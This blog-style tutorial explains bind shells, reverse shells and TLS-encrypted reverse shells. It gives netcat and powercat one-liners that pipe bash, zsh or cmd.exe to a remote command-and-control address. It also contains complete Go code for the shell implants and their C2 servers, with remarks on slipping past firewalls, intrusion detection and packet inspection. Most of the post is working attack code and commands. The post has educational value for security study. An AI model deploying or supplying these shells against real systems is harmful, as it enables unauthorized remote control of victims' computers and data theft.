---
layout: post
title: Understanding, Using and Implementimng Remote Shells (Bind Shell, Reverse Shell, Encrypted Reverse Shell)
tags: reverse shell hacking exploit infosec tutorial Go code netcat
---
### Table of contents

- [Introduction](#introduction)
- [Bind Shell](#bind-shell)
  - [Implementing a Bind Shell in Go](#implementing-a-bind-shell-in-go)
  - [Disadvantages of Bind Shells](#disadvantages-of-bind-shells)
- [Reverse Shell](#reverse-shell)
  - [Implementing a Reverse Shell in Go](#implementing-a-reverse-shell-in-go)
- [Encrypted Shells](#encrypted-shells)
- [Further resources](#further-resources)

## Introduction

_This article gives a holistic overview on the topic of remote shells. If you only care about the Go code check out the [repository](https://github.com/TomTietz/shells)._

In general a remote shell is a method of accessing a command-line interface (CLI) on a remote computer over a network. The two basic types of remote shells are bind shells and reverse shells. Both types have legitimate uses in system administration and remote support. For example, a system administrator may use a remote shell to manage servers in a data center from a remote location. However, because of their potential for misuse, remote shells are also a common tool used by attackers in network attacks. Attackers may use remote shells to gain unauthorized access to a target system, steal data, or launch additional attacks.

## Bind Shell

A bind shell is a type of remote shell that opens a network port on the remote computer and listens for incoming connections. When an admin or attacker connects to the port, a shell is spawned that allows them to execute commands on the remote computer. In the terms of the [Client-Server-Model](https://en.wikipedia.org/wiki/Client%E2%80%93server_model) the victim would act as a server and the attacker/admin as a client.
To create a bind shell you can use the [powercat](https://github.com/besimorhino/powercat) (Windows/Powershell) or netcat (Unix/Mac) command-line tools on both the victims and the attacker's system. To start listening on the victim's system use the commands:

- `nc -vlp [port number] -e /bin/bash` (Netcat/Linux)
- `nc -vlp [port number] -e /bin/zsh` (Netcat/Mac)
- `nc.exe -vlp [port number] -e cmd.exe` (Netcat/Windows)
- `powercat -l -p [port number] -ep` (Powercat/Windows)

In order to connect to this remote shell an attacker would use one of the following commands:

- `nc -v [remote IP] [port number]` (Netcat/Linux & Netcat/Mac)
- `nc.exe -v [remote IP] [port number]` (Netcat/Windows)
- `powercat -c [remote IP] -p [port number]` (Powercat/Windows)

### Implementing a Bind Shell in Go

Tools like netcat make the creation of a bind shell very easy but there are still many reasons why you would want to implement your own (integration with existing tools, automation, understanding, it's cool...). The function _bindShellHost_ shows a rudimentary implementation of a bind shell listener.

```Go
func bindShellHost(listenPort string) {

 // start a tcp listener on the specified port
 listener, err := net.Listen("tcp", "localhost:"+listenPort)
 if err != nil {
  log.Printf("An error occurred while initializing the listener on %v: %v\n", listenPort, err)
 } else {
  log.Println("Listening on tcp port " + listenPort + "...")
 }

 // infinite loop waiting for connections and handing them to the handler function
 for {
  connection, err := listener.Accept()
  if err != nil {
   log.Printf("An error occurred during an attempted connection: %v\n", err)
  }
  // concurrently handle all incoming connections
  go handleBindConnection(connection)
 }
}

// handle incoming connections
func handleBindConnection(conn net.Conn) {

 // log new connection
 log.Printf("Received connection from %v\n", conn.RemoteAddr().String())

 // determine local operating system
 os := runtime.GOOS

 // test connection by sending confirmation
 // note: data needs to be converted to []byte before being sent
 _, err := conn.Write([]byte(fmt.Sprintf("Successfully connected to client running %s\n", os)))
 if err != nil {
  log.Println("An error occured while trying to write to the connection:", err)
 }

 // make sure connection is closed when process finishes
 defer conn.Close()

 // start local shell depending on local operating system
 shell := exec.Command("/bin/bash")
 switch os {
 case "windows":
  shell = exec.Command("powershell.exe")
 case "linux":
  shell = exec.Command("/bin/bash")
 case "darwin":
  shell = exec.Command("/bin/zsh")
 }

 // connect shell to server
 shell.Stdin = conn
 shell.Stdout = conn
 shell.Stderr = conn
 shell.Run()
}
```

Remotely connecting to this shell can be done by either using same tools as shown above or by implementing your own little Command-and-Control server (CC). A skeleton implementation of such is shown in fucntion _bindShellCC_

```Go
// example of CC server that sends a user defined command to remote shell and returns the output
func bindShellCC(remoteAddr string, remotePort string, cmd string) []byte {

 // connect to the listener on the remote machine
 conn, err := net.Dial("tcp", remoteAddr+remotePort)
 if err != nil {
  log.Println("An error occurred while connecting to remote host:", err)
  os.Exit(1)
 } else {
  log.Println("Successfully connected to remote host")
 }

 // make sure connection is closed when process finishes
 defer conn.Close()

 // send command to remote host
 _, err = conn.Write([]byte(cmd + "\n"))
 if err != nil {
  log.Println("An error occurred while writing to the remote host connection:", err)
  os.Exit(2)
 }

 // read and return output (stdout, stderr) from remote shell
 buf := make([]byte, 1024)
 _, err = conn.Read(buf)
 if err != nil {
  log.Println("An error occurred while reading from the remote host connection:", err)
  os.Exit(3)
 }

 return buf
}
```

### Disadvantages of Bind Shells

Bind shells are a useful tools but they come with a handful of disadvantages that have made them less popular than reverse shells in recent years.

- Bind shells require an open network port on the remote computer, which can be detected and blocked by firewalls and intrusion detection systems (IDS). This makes it more difficult for an attacker to gain access to the remote system.
- Bind shells require the attacker to know the IP address or hostname of the remote system, which can be difficult to obtain in some cases. In contrast, reverse shells only require the remote system to be able to initiate outbound connections to a specified IP address and port.
- Bind shells allow **anyone** to connect to them making them a huge security issue and liability both for admins and malicioius actors who don't like competition.

## Reverse Shell

Reverse shells aim to fix the issues of bind shells by swithcing the client-server roles between the victim and the host. A reverse shell initiates a connection from the remote computer to a CC server listening on a network port. Once the connection is established, a shell is spawned that allows the attacker to execute commands on the remote computer.
One of the main advantages of a reverse shell is that it can bypass firewalls and other network security measures that block incoming connections (most hosts are intended to be used as clients not server). Because the connection is initiated from the remote system, it appears to be a legitimate outbound connection and may be allowed through network security measures that would otherwise block incoming connections.
Another advantage of reverse shells is that they don't require the attacker to know the IP address or hostname of the remote system in advance. Instead, the payload or script used to establish the reverse shell includes the IP address and port of the attacker's system, allowing the connection to be initiated automatically when the payload is executed on the remote system.
Furthermore it is not as easy for anyone to connect to our remote shell since the connection is established by the victim host directly to our CC server which is usually identified via a domain name or directly by IP address.

To create a reverse shell on a victim's system you can use one of the following commands (depending on OS, availability and preference):

- `nc -v [CC IP] [port number] -e /bin/zsh` (Netcat/Mac)
- `nc -v [CC IP] [port number] -e /bin/bash` (Netcat/Linux)
- `nc.exe -v [CC IP] [port number] -e cmd.exe` (Netcat/Windows)

The attacker then only has to run one of the followin g commands to establish a reverse shell connection:

- `nc –vlp [port number]` (Netcat/Linux & Netcat/Mac)
- `nc.exe –vlp [port number]` (Netcat/Windows)

### Implementing a Reverse Shell in Go

When reading the code for the reverse shell and the bind you will notice many similarities between the two as they perform essentially the same task but with switched roles regarding initialisation.

```Go
func reverseShellHost(serverAddr string, serverPort string) {

 // connect to the cc server
 conn, err := net.Dial("tcp", serverAddr+serverPort)
 if err != nil {
  log.Println("An error occurred while connecting to CC server:", err)
  os.Exit(1)
 } else {
  log.Println("Successfully connected to CC server")
 }

 // make sure connection is closed when process finishes
 defer conn.Close()

 // start local shell
 os := runtime.GOOS
 shell := exec.Command("/bin/bash")
 switch os {
 case "windows":
  shell = exec.Command("powershell.exe")
 case "linux":
  shell = exec.Command("/bin/bash")
 case "darwin":
  shell = exec.Command("/bin/zsh")
 }

 // connect shell to cc server
 shell.Stdin = conn
 shell.Stdout = conn
 shell.Stderr = conn
 shell.Run()

}
```

In this case the CC server uses concurrent handling of connection requests. Technically this concurrency is not only necessary if you actually handle multiple remote shells at the same time but it is nevertheless good coding habit to follow basic server principles.

```Go
// example of CC server that sends a user defined command to remote shell once a connection is established by
// the remote host
func reverseShellCC(cmd string) {

 // start a tcp listener on the specified port
 listener, err := net.Listen("tcp", "localhost:443")
 if err != nil {
  log.Printf("An error occurred while initializing the listener on 443: %v\n", err)
  os.Exit(1)
 } else {
  log.Println("Listening on tcp port 443...")
 }

 // Create channel for returns from goroutines
 ch := make(chan []byte)

 // infinite loop waiting for connections and handing them to the handler function
 for {
  connection, err := listener.Accept()
  if err != nil {
   log.Printf("An error occurred during an attempted connection: %v\n", err)
   os.Exit(2)
  }
  // concurrently handle all incoming connections
  go handleRevConnection(connection, cmd, ch)
 }
}

// handle incoming connections
func handleRevConnection(conn net.Conn, cmd string, ch chan []byte) {

 // log new connection
 log.Printf("Received connection from %v\n", conn.RemoteAddr().String())

 // make sure connection is closed when process finishes
 defer conn.Close()

 // send command to remote host
 _, err := conn.Write([]byte(cmd + "\n"))
 if err != nil {
  log.Println("An error occurred while writing to the remote host connection:", err)
  os.Exit(2)
 }

 // read output (stdout, stderr) from remote shell
 buf := make([]byte, 1024)

 _, err = conn.Read(buf)
 if err != nil {
  log.Println("An error occurred while reading from the remote host connection:", err)
  os.Exit(3)
 }

 // send remote shell output into channel (return does not work with goroutines)
 ch <- buf

}
```

## Encrypted Shells

Reverse shells fix many of the issues of bind shells but they still send all their traffic in clear text and with no authentication which makes the whole process vulnerable. Package inspection software, network administrator and malicious actors could still detect and exploit/fix our remote shell.
The solution is to use TLS to encrypt and authenticate the connection between the host and the CC server. This can be done with both bind and reverse shells by adding the `--ssl` option eg. `nc -v [CC IP] [port number] -e /bin/bash --ssl`
The following implementation is an extension of the previously shown reverse shell implementation and uses the same func tion to handle connections on the side of the CC server.

Host:

```Go
func encryptedReverseShellHost(connstr string) {

 // Establish connection
 conf := &tls.Config{}
 conn, err := tls.Dial("tcp", connstr, conf)
 if err != nil {
  log.Println("An error occurred while connecting to CC server:", err)
  os.Exit(1)
 } else {
  log.Println("Successfully connected to CC server")
 }

 // make sure connection is closed when process finishes
 defer conn.Close()

 // start local shell
 os := runtime.GOOS
 shell := exec.Command("/bin/bash")
 switch os {
 case "windows":
  shell = exec.Command("powershell.exe")
 case "linux":
  shell = exec.Command("/bin/bash")
 case "darwin":
  shell = exec.Command("/bin/zsh")
 }

 // connect shell to server
 shell.Stdin = conn
 shell.Stdout = conn
 shell.Stderr = conn
 shell.Run()
}
```

CC server:

```Go
// example of CC server that sends a user defined command to remote shell once a connection is initialized by
// the remote host
func encryptedReverseShellCC(cmd string) {

 // load server certificate/public key and private key
 cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
 if err != nil {
  log.Printf("An error occured while loading TLS keys: %v\n", err)
  os.Exit(1)
 }
 config := &tls.Config{Certificates: []tls.Certificate{cer}}

 // start a tcp/tls listener on the specified port
 listener, err := tls.Listen("tcp", "localhost:443", config)
 if err != nil {
  log.Printf("An error occurred while initializing the listener on 443: %v\n", err)
  os.Exit(2)
 } else {
  log.Println("Listening on tcp port 443...")
 }

 // Create channel for returns from goroutines
 ch := make(chan []byte)

 // infinite loop waiting for connections and handing them to the handler function
 for {
  connection, err := listener.Accept()
  if err != nil {
   log.Printf("An error occurred during an attempted connection: %v\n", err)
  }
  // concurrently handle all incoming connections
  // uses same handling function as reegular reverse shell
  go handleRevConnection(connection, cmd, ch)
 }
}
```

**[FULL CODE](https://github.com/TomTietz/shells)**

## Further resources

- For detailed explanations of _netcat_ command line options use `man nc` or see [here](https://www.unix.com/man-page/Linux/1/netcat/)
- Other useful tools for remote shells (and more): [sbd](https://www.kali.org/tools/sbd/), [ncat](https://nmap.org/ncat/), [Metasploit](https://www.metasploit.com/)